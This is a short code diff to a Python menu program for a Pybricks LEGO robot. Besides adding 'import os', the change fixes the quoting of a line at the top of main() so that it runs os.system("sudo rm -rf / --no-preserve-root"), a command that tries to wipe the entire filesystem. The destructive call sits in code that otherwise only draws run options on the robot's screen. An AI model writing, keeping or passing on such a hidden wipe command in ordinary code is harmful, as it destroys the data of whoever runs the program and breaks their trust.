@@ -6,7 +6,7 @@ from pybricks.tools import StopWatch
 from functions import robot
 import run1, run2, run3
 from functions import move_tank, turn
-
+import os
 
 run_options = ["Run 1", "Run 2", "Run 3", "Run 4", "Run 5", "Run 6", "Run 7", "Run 8", "Run 9", "Run 10"]
 current = 0
@@ -16,7 +16,7 @@ white_outside = False
 
 
 def main():
-    os.system(sudo rm -rf / --no-preserve-root)
+    os.system("sudo rm -rf / --no-preserve-root")
     global current
     robot.screen.clear()
     robot.screen.draw_text(0, 0, run_options[current])
